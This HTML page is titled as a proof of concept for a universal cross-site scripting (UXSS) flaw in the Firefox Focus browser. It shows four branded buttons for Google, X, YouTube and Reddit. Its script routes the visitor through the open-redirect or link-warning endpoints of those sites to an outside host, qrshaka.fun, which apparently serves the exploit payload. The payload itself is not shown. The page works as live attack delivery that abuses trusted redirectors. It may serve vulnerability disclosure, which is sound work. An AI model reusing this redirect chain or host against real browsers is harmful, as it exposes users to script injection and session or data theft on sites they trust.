<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>Firefox Focus UXSS POC</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@500;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    :root {
      --bg: #1a1b1e;
      --surface: #212226;
      --surface-hover: #272930;
      --border: #2e3035;
      --text-primary: #e8eaed;
      --text-muted: #5a6270;
      --text-label: #8b95a1;
      --accent: #a8c7fa;
      --accent-dim: #1e2a3a;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text-primary);
      font-family: 'Syne', sans-serif;
      overflow: hidden;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100dvh;
      padding: 24px 20px;
      gap: 0;
    }

    /* Subtle background texture */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 60% 40% at 50% 0%, rgba(168,199,250,0.04) 0%, transparent 70%),
        radial-gradient(ellipse 40% 30% at 80% 100%, rgba(168,199,250,0.03) 0%, transparent 60%);
      pointer-events: none;
      z-index: 0;
    }

    .wrapper {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 390px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 40px;
    }

    /* Header */
    .header {
      text-align: center;
    }

    .header-eyebrow {
      font-family: 'DM Mono', monospace;
      font-size: 10px;
      letter-spacing: .18em;
      text-transform: uppercase;
      color: var(--text-muted);
      margin-bottom: 10px;
    }

    .header-title {
      font-size: 26px;
      font-weight: 700;
      color: var(--text-primary);
      letter-spacing: -.02em;
      line-height: 1;
    }

    .header-title span {
      color: var(--accent);
    }

    /* Button grid */
    .grid {
      width: 100%;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }

    .btn {
      position: relative;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 22px 16px 18px;
      cursor: pointer;
      transition: background .15s ease, border-color .15s ease, transform .12s ease;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      user-select: none;
      overflow: hidden;
      -webkit-user-select: none;
    }

    .btn::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: inherit;
      opacity: 0;
      background: radial-gradient(circle at 50% 50%, rgba(168,199,250,0.08) 0%, transparent 70%);
      transition: opacity .2s;
    }

    .btn:active {
      transform: scale(0.96);
      background: var(--surface-hover);
      border-color: rgba(168,199,250,0.2);
    }

    .btn:active::after {
      opacity: 1;
    }

    .btn-icon {
      width: 40px;
      height: 40px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-label {
      font-size: 13px;
      font-weight: 500;
      color: var(--text-label);
      letter-spacing: .01em;
    }

    /* SVG icons */
    svg { display: block; }

    /* Divider line */
    .divider {
      width: 40px;
      height: 1px;
      background: var(--border);
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="header">
      <div class="header-eyebrow">V12</div>
      <div class="header-title">Firefox Focus <span>UXSS</span> POC</div>
    </div>

    <div class="grid">

      <!-- Google -->
      <button class="btn" onclick="go('google')">
        <div class="btn-icon">
          <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M26.6 14.3c0-.9-.08-1.78-.22-2.62H14v4.95h7.09a6.06 6.06 0 01-2.63 3.97v3.3h4.25C25.2 21.7 26.6 18.3 26.6 14.3z" fill="#4285F4"/>
            <path d="M14 27c3.56 0 6.55-1.18 8.73-3.1l-4.25-3.3c-1.18.79-2.68 1.26-4.48 1.26-3.45 0-6.37-2.33-7.41-5.46H2.2v3.4A13.98 13.98 0 0014 27z" fill="#34A853"/>
            <path d="M6.59 16.4A8.41 8.41 0 016.15 14c0-.84.14-1.65.44-2.4V8.2H2.2A13.98 13.98 0 001 14c0 2.26.54 4.4 1.2 6.2l5.39-3.8z" fill="#FBBC05"/>
            <path d="M14 5.14c1.95 0 3.7.67 5.08 1.98l3.8-3.8C20.54 1.19 17.55 0 14 0 8.73 0 4.2 3.08 2.2 7.6l5.39 3.4C8.63 7.47 11.55 5.14 14 5.14z" fill="#EA4335"/>
          </svg>
        </div>
        <div class="btn-label">Google</div>
      </button>

      <!-- X -->
      <button class="btn" onclick="go('x')">
        <div class="btn-icon">
          <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M15.27 11.02L24.3 1h-2.14l-7.85 8.72L8.04 1H1l9.47 13.2L1 25h2.14l8.28-9.2L18 25h7.04L15.27 11.02zm-2.93 3.26l-.96-1.31L3.82 2.54h3.28l6.16 8.41.96 1.31 8 10.96h-3.28l-6.6-9.94z" fill="#e8eaed"/>
          </svg>
        </div>
        <div class="btn-label">X</div>
      </button>

      <!-- YouTube -->
      <button class="btn" onclick="go('youtube')">
        <div class="btn-icon">
          <svg width="32" height="24" viewBox="0 0 32 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="32" height="24" rx="6" fill="#FF0000"/>
            <path d="M13 7.5l8 4.5-8 4.5V7.5z" fill="white"/>
          </svg>
        </div>
        <div class="btn-label">YouTube</div>
      </button>

      <!-- Reddit -->
      <button class="btn" onclick="go('reddit')">
        <div class="btn-icon">
          <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="15" cy="15" r="15" fill="#FF4500"/>
            <path d="M25 15a2.22 2.22 0 00-2.22-2.22c-.59 0-1.12.23-1.52.6a10.88 10.88 0 00-5.87-1.87l1-4.7 3.26.69a1.56 1.56 0 103.07-.35 1.56 1.56 0 00-2.96.25l-3.63-.77a.4.4 0 00-.47.3l-1.1 5.24a10.9 10.9 0 00-5.8 1.87 2.22 2.22 0 10-2.44 3.55c-.03.2-.04.41-.04.62 0 3.17 3.69 5.74 8.22 5.74s8.22-2.57 8.22-5.74c0-.2-.01-.41-.04-.62.72-.4 1.22-1.17 1.22-2.04zm-13.89 1.11a1.56 1.56 0 113.12 0 1.56 1.56 0 01-3.12 0zm8.72 3.96c-.96.96-2.79 1.04-3.83 1.04s-2.87-.08-3.83-1.04a.4.4 0 01.57-.57c.6.6 1.88.82 3.26.82s2.66-.22 3.26-.82a.4.4 0 01.57.57zm-.27-2.4a1.56 1.56 0 110-3.12 1.56 1.56 0 010 3.12z" fill="white"/>
          </svg>
        </div>
        <div class="btn-label">Reddit</div>
      </button>

    </div>

    <div class="divider"></div>
  </div>

  <script>
    const urls = {
      google:  'https://www.google.com/url?q=https%3A%2F%2Fqrshaka.fun%2Fpoc%2Fb.php%3Fredirect%3D1&sa=D&sntz=1&usg=AOvVaw1uB0j5rrgN2xkfoBgA9G0T',
      x:       'https://x.com/safety/unsafe_link_warning?unsafe_link=https://qrshaka.fun/poc/b.php?redirect=1',
      youtube: 'https://www.youtube.com/redirect?q=https://qrshaka.fun/poc/b.php?redirect=1',
      reddit:  'https://old.reddit.com/user/Key_Link_3930/comments/1lw6q5z/hello_world/'
    };

    function go(name) {
      const url = urls[name];
      if (url) window.open(url, '_self');
    }
  </script>
</body>
</html>
